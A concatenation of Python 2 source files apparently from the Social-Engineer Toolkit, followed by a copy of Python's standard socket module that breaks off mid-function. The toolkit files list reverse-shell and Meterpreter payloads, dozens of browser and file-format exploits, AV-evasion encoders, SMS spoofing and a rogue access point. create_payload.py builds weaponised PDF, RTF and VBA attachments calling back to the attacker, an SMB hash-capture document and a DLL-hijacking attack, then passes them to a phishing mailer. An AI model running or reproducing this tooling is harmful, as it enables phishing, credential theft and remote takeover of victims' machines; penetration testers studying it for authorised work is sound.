 The """ + bcolors.BOLD + """SMS""" + bcolors.ENDC + """ module allows you to specially craft SMS messages and send them
 to a person. You can spoof the SMS source.

 This module was created by the team at TB-Security.com.

 You can use a predefined template, create your own template or specify
 an arbitrary message. The main method for this would be to get a user to
 click or coax them on a link in their browser and steal credentials or
 perform other attack vectors.
""")

wireless_attack_menu = ['Start the SET Wireless Attack Vector Access Point',
                        'Stop the SET Wireless Attack Vector Access Point',
                        '0D']


wireless_attack_text = """
 The """ + bcolors.BOLD + """Wireless Attack""" + bcolors.ENDC + """ module will create an access point leveraging your
 wireless card and redirect all DNS queries to you. The concept is fairly
 simple, SET will create a wireless access point, dhcp server, and spoof
 DNS to redirect traffic to the attacker machine. It will then exit out
 of that menu with everything running as a child process.

 You can then launch any SET attack vector you want, for example the Java
 Applet attack and when a victim joins your access point and tries going to
 a website, will be redirected to your attacker machine.

 This attack vector requires AirBase-NG, AirMon-NG, DNSSpoof, and dhcpd3.

"""

infectious_menu = ['File-Format Exploits',
                   'Standard Metasploit Executable',
                   '0D']


infectious_text = """
 The """ + bcolors.BOLD + bcolors.GREEN + """Infectious """ + bcolors.ENDC + """USB/CD/DVD module will create an autorun.inf file and a
 Metasploit payload. When the DVD/USB/CD is inserted, it will automatically
 run if autorun is enabled.""" + bcolors.ENDC + """

 Pick the attack vector you wish to use: fileformat bugs or a straight executable.
"""


# used in create_payloads.py
if operating_system != "windows":
    if msf_path != False:
        payload_menu_1 = [
'Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker',
'Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker',
'Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker',
'Windows Bind Shell                      Execute payload and create an accepting port on remote system',
'Windows Bind Shell X64                  Windows x64 Command Shell, Bind TCP Inline',
'Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline',
'Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter',
'Windows Meterpreter All Ports           Spawn a meterpreter shell and find a port home (every port)',
'Windows Meterpreter Reverse HTTPS       Tunnel communication over HTTP using SSL and use Meterpreter',
'Windows Meterpreter Reverse DNS         Use a hostname instead of an IP address and spawn Meterpreter',
'SE Toolkit Interactive Shell            Custom interactive reverse toolkit designed for SET',
'SE Toolkit HTTP Reverse Shell           Purely native HTTP shell with AES encryption support',
'RATTE HTTP Tunneling Payload            Security bypass payload that will tunnel all comms over HTTP',
'ShellCodeExec Alphanum Shellcode        This will drop a meterpreter payload through shellcodeexec',
'PyInjector Shellcode Injection          This will drop a meterpreter payload through PyInjector',
'MultiPyInjector Shellcode Injection     This will drop multiple Metasploit payloads via memory',
'Import your own executable              Specify a path for your own executable\n']

if operating_system == "windows" or msf_path == False:
    payload_menu_1 = [
        'SE Toolkit Interactive Shell    Custom interactive reverse toolkit designed for SET',
        'SE Toolkit HTTP Reverse Shell   Purely native HTTP shell with AES encryption support',
        'RATTE HTTP Tunneling Payload    Security bypass payload that will tunnel all comms over HTTP\n']

payload_menu_1_text = """
What payload do you want to generate:

  Name:                                       Description:
"""

# used in gen_payload.py

payload_menu_2 = [
'Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker',
'Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker',
'Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker',
'Windows Bind Shell                      Execute payload and create an accepting port on remote system.',
'Windows Bind Shell X64                  Windows x64 Command Shell, Bind TCP Inline',
'Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline',
'Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter',
'Windows Meterpreter Egress Buster       Spawn a meterpreter shell and find a port home via multiple ports',
'Windows Meterpreter Reverse HTTPS       Tunnel communication over HTTP using SSL and use Meterpreter',
'Windows Meterpreter Reverse DNS         Use a hostname instead of an IP address and use Reverse Meterpreter',
'Download/Run your Own Executable        Downloads an executable and runs it\n'
]


payload_menu_2_text = """\n"""

payload_menu_3_text = ""
payload_menu_3 = [
'Windows Reverse TCP Shell              Spawn a command shell on victim and send back to attacker',
'Windows Meterpreter Reverse_TCP        Spawn a meterpreter shell on victim and send back to attacker',
'Windows Reverse VNC DLL                Spawn a VNC server on victim and send back to attacker',
'Windows Reverse TCP Shell (x64)        Windows X64 Command Shell, Reverse TCP Inline',
'Windows Meterpreter Reverse_TCP (X64)  Connect back to the attacker (Windows x64), Meterpreter',
'Windows Shell Bind_TCP (X64)           Execute payload and create an accepting port on remote system',
'Windows Meterpreter Reverse HTTPS      Tunnel communication over HTTP using SSL and use Meterpreter\n']

# called from create_payload.py associated dictionary = ms_attacks
create_payloads_menu = [
'SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)',
'SET Custom Written Document UNC LM SMB Capture Attack',
'MS14-017 Microsoft Word RTF Object Confusion (2014-04-01)',
'Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow',
'Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)',
'Adobe Flash Player "Button" Remote Code Execution',
'Adobe CoolType SING Table "uniqueName" Overflow',
'Adobe Flash Player "newfunction" Invalid Pointer Use',
'Adobe Collab.collectEmailInfo Buffer Overflow',
'Adobe Collab.getIcon Buffer Overflow',
'Adobe JBIG2Decode Memory Corruption Exploit',
'Adobe PDF Embedded EXE Social Engineering',
'Adobe util.printf() Buffer Overflow',
'Custom EXE to VBA (sent via RAR) (RAR required)',
'Adobe U3D CLODProgressiveMeshDeclaration Array Overrun',
'Adobe PDF Embedded EXE Social Engineering (NOJS)',
'Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow',
'Apple QuickTime PICT PnSize Buffer Overflow',
'Nuance PDF Reader v6.0 Launch Stack Buffer Overflow',
'Adobe Reader u3D Memory Corruption Vulnerability',
'MSCOMCTL ActiveX Buffer Overflow (ms12-027)\n']

create_payloads_text = """
 Select the file format exploit you want.
 The default is the PDF embedded EXE.\n
           ********** PAYLOADS **********\n"""

browser_exploits_menu = [
'MS14-012 Microsoft Internet Explorer TextRange Use-After-Free (2014-03-11)',
'MS14-012 Microsoft Internet Explorer CMarkup Use-After-Free (2014-02-13)',
'Internet Explorer CDisplayPointer Use-After-Free (10/13/2013)',
'Micorosft Internet Explorer SetMouseCapture Use-After-Free (09/17/2013)',
'Java Applet JMX Remote Code Execution (UPDATED 2013-01-19)',
'Java Applet JMX Remote Code Execution (2013-01-10)',
'MS13-009 Microsoft Internet Explorer SLayoutRun Use-AFter-Free (2013-02-13)',
'Microsoft Internet Explorer CDwnBindInfo Object Use-After-Free (2012-12-27)',
'Java 7 Applet Remote Code Execution (2012-08-26)',
'Microsoft Internet Explorer execCommand Use-After-Free Vulnerability (2012-09-14)',
'Java AtomicReferenceArray Type Violation Vulnerability (2012-02-14)',
'Java Applet Field Bytecode Verifier Cache Remote Code Execution (2012-06-06)',
'MS12-037 Internet Explorer Same ID Property Deleted Object Handling Memory Corruption (2012-06-12)',
'Microsoft XML Core Services MSXML Uninitialized Memory Corruption (2012-06-12)',
'Adobe Flash Player Object Type Confusion  (2012-05-04)',
'Adobe Flash Player MP4 "cprt" Overflow (2012-02-15)',
'MS12-004 midiOutPlayNextPolyEvent Heap Overflow (2012-01-10)',
'Java Applet Rhino Script Engine Remote Code Execution (2011-10-18)',
'MS11-050 IE mshtml!CObjectElement Use After Free  (2011-06-16)',
'Adobe Flash Player 10.2.153.1 SWF Memory Corruption Vulnerability (2011-04-11)',
'Cisco AnyConnect VPN Client ActiveX URL Property Download and Execute (2011-06-01)',
'Internet Explorer CSS Import Use After Free (2010-11-29)',
'Microsoft WMI Administration Tools ActiveX Buffer Overflow (2010-12-21)',
'Internet Explorer CSS Tags Memory Corruption (2010-11-03)',
'Sun Java Applet2ClassLoader Remote Code Execution (2011-02-15)',
'Sun Java Runtime New Plugin docbase Buffer Overflow (2010-10-12)',
'Microsoft Windows WebDAV Application DLL Hijacker (2010-08-18)',
'Adobe Flash Player AVM Bytecode Verification Vulnerability (2011-03-15)',
'Adobe Shockwave rcsL Memory Corruption Exploit (2010-10-21)',
'Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow (2010-09-07)',
'Apple QuickTime 7.6.7 Marshaled_pUnk Code Execution (2010-08-30)',
'Microsoft Help Center XSS and Command Execution (2010-06-09)',
'Microsoft Internet Explorer iepeers.dll Use After Free (2010-03-09)',
'Microsoft Internet Explorer "Aurora" Memory Corruption (2010-01-14)',
'Microsoft Internet Explorer Tabular Data Control Exploit (2010-03-0)',
'Microsoft Internet Explorer 7 Uninitialized Memory Corruption (2009-02-10)',
'Microsoft Internet Explorer Style getElementsbyTagName Corruption (2009-11-20)',
'Microsoft Internet Explorer isComponentInstalled Overflow (2006-02-24)',
'Microsoft Internet Explorer Explorer Data Binding Corruption (2008-12-07)',
'Microsoft Internet Explorer Unsafe Scripting Misconfiguration (2010-09-20)',
'FireFox 3.5 escape Return Value Memory Corruption (2009-07-13)',
'FireFox 3.6.16 mChannel use after free vulnerability (2011-05-10)',
'Metasploit Browser Autopwn (USE AT OWN RISK!)\n']

browser_exploits_text = """
 Enter the browser exploit you would like to use [8]:
"""

# this is for the powershell attack vectors
powershell_menu = ['Powershell Alphanumeric Shellcode Injector',
                  'Powershell Reverse Shell',
                  'Powershell Bind Shell',
                  'Powershell Dump SAM Database',
                  '0D']

powershell_text = ("""
The """ + bcolors.BOLD + """Powershell Attack Vector""" + bcolors.ENDC + """ module allows you to create PowerShell specific attacks. These attacks will allow you to use PowerShell which is available by default in all operating systems Windows Vista and above. PowerShell provides a fruitful  landscape for deploying payloads and performing functions that  do not get triggered by preventative technologies.\n""")


encoder_menu = ['shikata_ga_nai',
                'No Encoding',
                'Multi-Encoder',
                'Backdoored Executable\n']

encoder_text = """
Select one of the below, 'backdoored executable' is typically the best. However,
most still get picked up by AV. You may need to do additional packing/crypting
in order to get around basic AV detection.
"""

dll_hijacker_text = """
 The DLL Hijacker vulnerability will allow normal file extenstions to
 call local (or remote) .dll files that can then call your payload or
 executable. In this scenario it will compact the attack in a zip file
 and when the user opens the file extension, will trigger the dll then
 ultimately our payload. During the time of this release, all of these
 file extensions were tested and appear to work and are not patched. This
 will continiously be updated as time goes on.
"""

fakeap_dhcp_menu = ['10.0.0.100-254',
                    '192.168.10.100-254\n']

fakeap_dhcp_text = "Please choose which DHCP Config you would like to use: "

########NEW FILE########
__FILENAME__ = module_handler
#!/usr/bin/env python

## module_handler.py

import glob
import re
import sys
from src.core.setcore import *

# this is just if the user wants to return to menu
menu_return = "false"

# base counter to identify numbers
counter = 0

# get the menu going
print "\n"
print_info_spaces("Social-Engineer Toolkit Third Party Modules menu.")
print_info_spaces("Please read the readme/modules.txt for information on how to create your own modules.\n")

for name in glob.glob("modules/*.py"):

    counter = counter + 1
    fileopen = file(name, "r")

    for line in fileopen:
        line = line.rstrip()
        match = re.search("MAIN=", line)
        if match:
            line = line.replace('MAIN="', "")
            line = line.replace('"', "")
            line = "  " + str(counter) + ". " + line
            print line

print "\n  99. Return to the previous menu\n"
choice = raw_input(setprompt(["9"], ""))

if choice == 'exit':
    exit_set()

if choice == '99':
    menu_return = "true"

# throw error if not integer
try:
    choice = int(choice)
except:
    print_warning("An integer was not used try again")
    choice = raw_input(setprompt(["9"], ""))

# start a new counter to match choice
counter = 0

if menu_return == "false":
    # pull any files in the modules directory that starts with .py
    for name in glob.glob("modules/*.py"):

        counter = counter+1

        if counter == int(choice):
            # get rid of .modules extension
            name = name.replace("modules/", "")
            # get rid of .py extension
            name = name.replace(".py", "")
            # changes our system path to modules so we can import the files
            sys.path.append("modules/")
            # this will import the third party module

            try:
                exec("import " + name)
            except:
                pass

            # this will call the main() function inside the python file
            # if it doesn't exist it will still continue just throw a warning
            try:
                exec("%s.main()" % (name))
            # handle the exception if main isn't there
            except Exception, e:
                raw_input("   [!] There was an issue with a module: %s." % (e))
                return_continue()

########NEW FILE########
__FILENAME__ = create_payload
#!/usr/bin/python
## PDF spear phishing attack here

import subprocess
import re
import sys
import os
import socket
import pexpect
import time
from src.core.setcore import *
from src.core.dictionaries import *
from src.core.menu.text import *

me = mod_name()
definepath=os.getcwd()
define_version = get_version()
users_home = os.getenv("HOME")

# metasploit path
meta_path=meta_path()

# define if we need apache or not for dll hijacking
# define if use apache or not
apache=0

# open set_config
apache_check=file("%s/config/set_config" % (definepath),"r").readlines()

# loop this guy to search for the APACHE_SERVER config variable
for line in apache_check:
    # strip \r\n
    line=line.rstrip()
    # if apache is turned on get things ready
    match=re.search("APACHE_SERVER=ON",line)
    # if its on lets get apache ready
    if match:
        for line2 in apache_check:
            # set the apache path here
            match2=re.search("APACHE_DIRECTORY=", line2)
            if match2:
                line2=line2.rstrip()
                apache_path=line2.replace("APACHE_DIRECTORY=","")
                apache=1

###################################################
#        USER INPUT: SHOW PAYLOAD MENU            #
###################################################
inputpdf=""
target=""
exploit = "INVALID"
while exploit == "INVALID":
    debug_msg(me,"printing 'src.core.menu.text.create_payloads_menu'",5)
    show_payload_menu1 = create_menu(create_payloads_text, create_payloads_menu)
    exploit = raw_input(setprompt(["4"], ""))
    print "\n"

    # Do conditional checks for the value of 'exploit', which should be a number
    # Handle any additional tasks before doing the dictionary lookup and
    # converting the user returned value to the metasploit string
    # here we specify if its a pdf or rtf

    if exploit == 'exit':
        exit_set()

    if exploit == "":
        exploit='1'        # 'SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)'

    if exploit == '3':     #'Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow'
        outfile=("template.doc")

    if exploit == '4':     #'Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)'
        outfile=("template.rtf")
        target=("TARGET=1")

    if exploit == "5":
        outfile = ("template.mov")

    if exploit != '3' and exploit != '4' and exploit !="17":
        outfile=("template.pdf")


    debug_msg(me,'current input was read as: %s' % exploit,3)
    exploit=ms_attacks(exploit)
    debug_msg(me,'value was translated to: %s' % exploit,3)

    if exploit == "INVALID":
        print_warning("that choice is invalid...please try again or press ctrl-c to Cancel.")
        time.sleep(2)

# 'exploit' has been converted to the string by now, so we need to
#  evaluate the string instead of the user input number from here on...
if exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe" or exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs":
    print_info("Default payload creation selected. SET will generate a normal PDF with embedded EXE.")
    print """
    1. Use your own PDF for attack
    2. Use built-in BLANK PDF for attack\n"""

    choicepdf = raw_input(setprompt(["4"], ""))

    if choicepdf == 'exit':
        exit_set()

    if choicepdf == '1':
        # define if user wants to use their own pdf or built in one
        inputpdf=raw_input(setprompt(["4"], "Enter path to your pdf [blank-builtin]"))
        # if blank, then default to normal pdf
        if inputpdf == "":
            # change to default SET pdf
            print_info("Defaulting to BLANK PDF built into SET...")
            inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"
        # if no file exists defalt this
        if not os.path.isfile(inputpdf):
            print_warning("Unable to find PDF, defaulting to blank PDF.")
            inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"
        # if pdf exists, we are good
        if os.path.isfile(inputpdf):
            inputpdf="INFILENAME="+inputpdf

    if choicepdf == '2':
        inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"

    if choicepdf == "":
        inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"

exploit_counter=0

if exploit == "dll_hijacking" or exploit == "unc_embed":
    exploit_counter=1

if exploit_counter == 0:

    ###################################################
    #        USER INPUT: SHOW PAYLOAD MENU 3          #
    ###################################################
    debug_msg(me,"printing 'src.core.menu.text.payload_menu_3'",5)
    show_payload_menu3 = create_menu(payload_menu_3_text, payload_menu_3)
    payload=raw_input(setprompt(["4"], ""))
    noencode=0

    if payload == 'exit':
        exit_set()

    if payload == "" : payload="2"
    if payload == '4' or payload == '5' or payload == '6':
        noencode=1

    payload=ms_payload_3(payload)


    # imported from central, grabs ip address
    rhost=grab_ipaddress()

    # SET LPORT
    lport=raw_input(setprompt(["4"], "Port to connect back on [443]"))

    # if blank default to 443
    if lport == "":
        lport="443"
        print_info("Defaulting to port 443...")

    # SET FILE OUTPATH
    # /root/.msf4/local/msf.pdf
    filename_code = outfile
    outpath=(users_home + "/.msf4/local/" + outfile)
    print_info("Generating fileformat exploit...")
    # START THE EXE TO VBA PAYLOAD
    if exploit != 'custom/exe/to/vba/payload':
        outfile = setdir + "/%s" % (outfile)
        subprocess.Popen("ruby %s/msfcli %s PAYLOAD=%s LHOST=%s LPORT=%s OUTPUTPATH=%s FILENAME=%s %s ENCODING=shikata_ga_nai %s E" % (meta_path,exploit,payload,rhost,lport,outpath,outfile,target,inputpdf), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
        subprocess.Popen("cp " + users_home + "/.msf4/local/%s %s" % (filename_code, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
        print_status("Payload creation complete.")
        time.sleep(1)
        print_status("All payloads get sent to the %s directory" % (outfile))
    if exploit == 'custom/exe/to/vba/payload':
        # Creating Payload here
        # if not 64 specify raw output and filename of vb1.exe
        if noencode == 0:
            execute1=("R")
            payloadname=("vb1.exe")
        if noencode == 1:
            execute1=("X")
            payloadname=("vb.exe")
        subprocess.Popen("ruby %s/msfpayload %s %s %s ENCODING=shikata_ga_nai %s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True).wait()
        if noencode == 0:
            subprocess.Popen("ruby %s/msfencode -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" % (meta_path,setdir,setdir), shell=True).wait()
        # Create the VB script here
        subprocess.Popen("%s/tools/exe2vba.rb %s/vb.exe %s/template.vbs" % (meta_path,setdir,setdir), shell=True).wait()
        print_info("Raring the VBS file.")
        subprocess.Popen("rar a %s/template.rar %s/template.vbs" % (setdir,setdir), shell=True).wait()

    # NEED THIS TO PARSE DELIVERY OPTIONS TO SMTP MAILER
    filewrite=file(setdir + "/payload.options","w")
    filewrite.write(payload+" "+rhost+" "+lport)
    filewrite.close()
    if exploit != "dll_hijacking":
        if not os.path.isfile(setdir + "/fileformat.file"):
            sys.path.append("src/phishing/smtp/client/")
            debug_msg(me,"importing 'src.phishing.smtp.client.smtp_client'",1)
            try: reload(smtp_client)
            except: import smtp_client

# start the unc_embed attack stuff here
if exploit == "unc_embed":
    rhost=grab_ipaddress
    import string,random
    def random_string(minlength=6,maxlength=15):
        length=random.randint(minlength,maxlength)
        letters=string.ascii_letters+string.digits
        return ''.join([random.choice(letters) for _ in range(length)])
    rand_gen=random_string()
    filewrite=file(setdir + "/unc_config", "w")
    filewrite.write("use server/capture/smb\n")
    filewrite.write("exploit -j\n\n")
    filewrite.close()
    filewrite=file(setdir + "/template.doc", "w")
    filewrite.write(r'''<html><head></head><body><img src="file://\\%s\%s.jpeg">''' %(rhost,rand_gen))
    filewrite.close()
    sys.path.append("src/phishing/smtp/client/")
    debug_msg(me, "importing 'src.phishing.smtp.client.smtp_client'",1)
    try: reload(smtp_client)
    except: import smtp_client

# start the dll_hijacking stuff here
if exploit == "dll_hijacking":
    sys.path.append("src/core/payloadgen")
    debug_msg(me, "importing 'src.core.payloadgen.create_payloads'",1)
    try: reload(create_payloads)
    except: import create_payloads

    sys.path.append("src/webattack/dll_hijacking")
    debug_msg(me, "importing 'src.webattack.dll_hijacking.hijacking'",1)
    try: reload(hijacking)
    except: import hijacking

    # if we are not using apache
    if apache == 0:
        if not os.path.isfile("%s/fileformat.file" % (setdir)):
    #        try:
            filewrite=file(setdir + "/attack_vector","w")
            filewrite.write("hijacking")
            filewrite.close()
            filewrite=file(setdir + "/site.template","w")
            filewrite.write("TEMPLATE=CUSTOM")
            filewrite.close()
            time.sleep(1)
            subprocess.Popen("mkdir %s/web_clone;cp src/html/msf.exe %s/web_clone/x" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            child=pexpect.spawn("python src/html/web_server.py")
    #        except: child.close()
    # if we are using apache
    if apache == 1:
        subprocess.Popen("cp src/html/msf.exe %s/x.exe" % (apache_path), shell=True).wait()

    if os.path.isfile(setdir + "/meta_config"):
        # if we aren't using the infectious method then do normal routine
        if not os.path.isfile("%s/fileformat.file" % (setdir)):
            print_info("This may take a few to load MSF...")
            try:
                child1=pexpect.spawn("ruby %s/msfconsole -L -r %s/meta_config" % (meta_path,setdir))
            except:
                try:
                    child1.close()
                except: pass

    # get the emails out
    # if we aren't using the infectious method then do the normal routine
    if not os.path.isfile("%s/fileformat.file" % (setdir)):
        sys.path.append("src/phishing/smtp/client/")
        debug_msg(me, "importing 'src.phishing.smtp.client.smtp_client'",1)
        try: reload(smtp_client)
        except: import smtp_client
        try:
            child1.interact()
        except:
            if apache == 0:
                try:
                    child.close()
                    child1.close()
                except: pass

########NEW FILE########
__FILENAME__ = msf_list
#!/usr/bin/python
from src.core.setcore import debug_msg, mod_name
import subprocess
import re
import sys

me = mod_name()

sys.path.append("src/core")
debug_msg(me,"re-importing 'src.core.setcore'",1)
try: reload(setcore)
except: import setcore
print "[---] Updating the Social Engineer Toolkit FileFormat Exploit List [---]"
generate_list=subprocess.Popen("%s/msfcli | grep fileformat > src/core/msf_attacks/database/msf.database" % (meta_path), shell=True).wait()
print "[---] Database is now up-to-date [---]"

########NEW FILE########
__FILENAME__ = socket
# Wrapper module for _socket, providing some additional facilities
# implemented in Python.

"""\
This module provides socket operations and some related functions.
On Unix, it supports IP (Internet Protocol) and Unix domain sockets.
On other systems, it only supports IP. Functions specific for a
socket are available as methods of the socket object.

Functions:

socket() -- create a new socket object
socketpair() -- create a pair of new socket objects [*]
fromfd() -- create a socket object from an open file descriptor [*]
gethostname() -- return the current hostname
gethostbyname() -- map a hostname to its IP number
gethostbyaddr() -- map an IP number or hostname to DNS info
getservbyname() -- map a service name and a protocol name to a port number
getprotobyname() -- map a protocol name (e.g. 'tcp') to a number
ntohs(), ntohl() -- convert 16, 32 bit int from network to host byte order
htons(), htonl() -- convert 16, 32 bit int from host to network byte order
inet_aton() -- convert IP addr string (123.45.67.89) to 32-bit packed format
inet_ntoa() -- convert 32-bit packed format IP to string (123.45.67.89)
ssl() -- secure socket layer support (only available if configured)
socket.getdefaulttimeout() -- get the default timeout value
socket.setdefaulttimeout() -- set the default timeout value
create_connection() -- connects to an address, with an optional timeout and
                       optional source address.

 [*] not available on all platforms!

Special objects:

SocketType -- type object for socket objects
error -- exception raised for I/O errors
has_ipv6 -- boolean value indicating if IPv6 is supported

Integer constants:

AF_INET, AF_UNIX -- socket domains (first argument to socket() call)
SOCK_STREAM, SOCK_DGRAM, SOCK_RAW -- socket types (second argument)

Many other constants may be defined; these may be used in calls to
the setsockopt() and getsockopt() methods.
"""

import _socket
from _socket import *
from functools import partial
from types import MethodType

try:
    import _ssl
except ImportError:
    # no SSL support
    pass
else:
    def ssl(sock, keyfile=None, certfile=None):
        # we do an internal import here because the ssl
        # module imports the socket module
        import ssl as _realssl
        warnings.warn("socket.ssl() is deprecated.  Use ssl.wrap_socket() instead.",
                      DeprecationWarning, stacklevel=2)
        return _realssl.sslwrap_simple(sock, keyfile, certfile)

    # we need to import the same constants we used to...
    from _ssl import SSLError as sslerror
    from _ssl import \
         RAND_add, \
         RAND_egd, \
         RAND_status, \
         SSL_ERROR_ZERO_RETURN, \
         SSL_ERROR_WANT_READ, \
         SSL_ERROR_WANT_WRITE, \
         SSL_ERROR_WANT_X509_LOOKUP, \
         SSL_ERROR_SYSCALL, \
         SSL_ERROR_SSL, \
         SSL_ERROR_WANT_CONNECT, \
         SSL_ERROR_EOF, \
         SSL_ERROR_INVALID_ERROR_CODE

import os, sys, warnings

try:
    from cStringIO import StringIO
except ImportError:
    from StringIO import StringIO

try:
    import errno
except ImportError:
    errno = None
EBADF = getattr(errno, 'EBADF', 9)
EINTR = getattr(errno, 'EINTR', 4)

__all__ = ["getfqdn", "create_connection"]
__all__.extend(os._get_exports_list(_socket))


_realsocket = socket

# WSA error codes
if sys.platform.lower().startswith("win"):
    errorTab = {}
    errorTab[10004] = "The operation was interrupted."
    errorTab[10009] = "A bad file handle was passed."
    errorTab[10013] = "Permission denied."
    errorTab[10014] = "A fault occurred on the network??" # WSAEFAULT
    errorTab[10022] = "An invalid operation was attempted."
    errorTab[10035] = "The socket operation would block"
    errorTab[10036] = "A blocking operation is already in progress."
    errorTab[10048] = "The network address is in use."
    errorTab[10054] = "The connection has been reset."
    errorTab[10058] = "The network has been shut down."
    errorTab[10060] = "The operation timed out."
    errorTab[10061] = "Connection refused."
    errorTab[10063] = "The name is too long."
    errorTab[10064] = "The host is down."
    errorTab[10065] = "The host is unreachable."
    __all__.append("errorTab")



def getfqdn(name=''):
    """Get fully qualified domain name from name.

    An empty argument is interpreted as meaning the local host.

    First the hostname returned by gethostbyaddr() is checked, then
    possibly existing aliases. In case no FQDN is available, hostname
    from gethostname() is returned.
    """
    name = name.strip()
    if not name or name == '0.0.0.0':
        name = gethostname()
    try:
        hostname, aliases, ipaddrs = gethostbyaddr(name)
    except error:
        pass
    else:
        aliases.insert(0, hostname)
        for name in aliases:
            if '.' in name:
                break
        else:
            name = hostname
    return name


_socketmethods = (
    'bind', 'connect', 'connect_ex', 'fileno', 'listen',
    'getpeername', 'getsockname', 'getsockopt', 'setsockopt',
    'sendall', 'setblocking',
    'settimeout', 'gettimeout', 'shutdown')

if os.name == "nt":
    _socketmethods = _socketmethods + ('ioctl',)

if sys.platform == "riscos":
    _socketmethods = _socketmethods + ('sleeptaskw',)

# All the method names that must be delegated to either the real socket
# object or the _closedsocket object.
_delegate_methods = ("recv", "recvfrom", "recv_into", "recvfrom_into",
                     "send", "sendto")

class _closedsocket(object):
    __slots__ = []
    def _dummy(*args):
        raise error(EBADF, 'Bad file descriptor')
    # All _delegate_methods must also be initialized here.
    send = recv = recv_into = sendto = recvfrom = recvfrom_into = _dummy
    __getattr__ = _dummy

# Wrapper around platform socket objects. This implements
# a platform-independent dup() functionality. The
# implementation currently relies on reference counting
# to close the underlying socket object.
class _socketobject(object):

    __doc__ = _realsocket.__doc__

    __slots__ = ["_sock", "__weakref__"] + list(_delegate_methods)

    def __init__(self, family=AF_INET, type=SOCK_STREAM, proto=0, _sock=None):
        if _sock is None:
            _sock = _realsocket(family, type, proto)
        self._sock = _sock
        for method in _delegate_methods:
            setattr(self, method, getattr(_sock, method))

    def close(self, _closedsocket=_closedsocket,
              _delegate_methods=_delegate_methods, setattr=setattr):
        # This function should not reference any globals. See issue #808164.
        self._sock = _closedsocket()
        dummy = self._sock._dummy
        for method in _delegate_methods:
            setattr(self, method, dummy)
    close.__doc__ = _realsocket.close.__doc__

    def accept(self):
        sock, addr = self._sock.accept()
        return _socketobject(_sock=sock), addr
    accept.__doc__ = _realsocket.accept.__doc__

    def dup(self):
        """dup() -> socket object

        Return a new socket object connected to the same system resource."""
        return _socketobject(_sock=self._sock)

    def makefile(self, mode='r', bufsize=-1):
        """makefile([mode[, bufsize]]) -> file object

        Return a regular file object corresponding to the socket.  The mode
        and bufsize arguments are as for the built-in open() function."""
        return _fileobject(self._sock, mode, bufsize)

    family = property(lambda self: self._sock.family, doc="the socket family")
    type = property(lambda self: self._sock.type, doc="the socket type")
    proto = property(lambda self: self._sock.proto, doc="the socket protocol")

def meth(name,self,*args):
    return getattr(self._sock,name)(*args)

for _m in _socketmethods:
    p = partial(meth,_m)
    p.__name__ = _m
    p.__doc__ = getattr(_realsocket,_m).__doc__
    m = MethodType(p,None,_socketobject)
    setattr(_socketobject,_m,m)

socket = SocketType = _socketobject

class _fileobject(object):
    """Faux file object attached to a socket object."""

    default_bufsize = 8192
    name = "<socket>"

    __slots__ = ["mode", "bufsize", "softspace",
                 # "closed" is a property, see below
                 "_sock", "_rbufsize", "_wbufsize", "_rbuf", "_wbuf", "_wbuf_len",
                 "_close"]

    def __init__(self, sock, mode='rb', bufsize=-1, close=False):
        self._sock = sock
        self.mode = mode # Not actually used in this version
        if bufsize < 0:
            bufsize = self.default_bufsize
        self.bufsize = bufsize
        self.softspace = False
        # _rbufsize is the suggested recv buffer size.  It is *strictly*
        # obeyed within readline() for recv calls.  If it is larger than
        # default_bufsize it will be used for recv calls within read().
        if bufsize == 0:
            self._rbufsize = 1
        elif bufsize == 1:
            self._rbufsize = self.default_bufsize
        else:
            self._rbufsize = bufsize
        self._wbufsize = bufsize
        # We use StringIO for the read buffer to avoid holding a list
        # of variously sized string objects which have been known to
        # fragment the heap due to how they are malloc()ed and often
        # realloc()ed down much smaller than their original allocation.
        self._rbuf = StringIO()
        self._wbuf = [] # A list of strings
        self._wbuf_len = 0
        self._close = close

    def _getclosed(self):
        return self._sock is None
    closed = property(_getclosed, doc="True if the file is closed")

    def close(self):
        try:
            if self._sock:
                self.flush()
        finally:
            if self._close:
                self._sock.close()
            self._sock = None

    def __del__(self):
        try:
            self.close()
        except:
            # close() may fail if __init__ didn't complete
            pass

    def flush(self):
        if self._wbuf:
            data = "".join(self._wbuf)
            self._wbuf = []
            self._wbuf_len = 0
            buffer_size = max(self._rbufsize, self.default_bufsize)
            data_size = len(data)
            write_offset = 0
            view = memoryview(data)
            try:
                while write_offset < data_size:
                    self._sock.sendall(view[write_offset:write_offset+buffer_size])
                    write_offset += buffer_size
            finally:
                if write_offset < data_size:
                    remainder = data[write_offset:]
                    del view, data  # explicit free
                    self._wbuf.append(remainder)
                    self._wbuf_len = len(remainder)

    def fileno(self):
        return self._sock.fileno()

    def write(self, data):
        data = str(data) # XXX Should really reject non-string non-buffers
        if not data:
            return
        self._wbuf.append(data)
        self._wbuf_len += len(data)
        if (self._wbufsize == 0 or
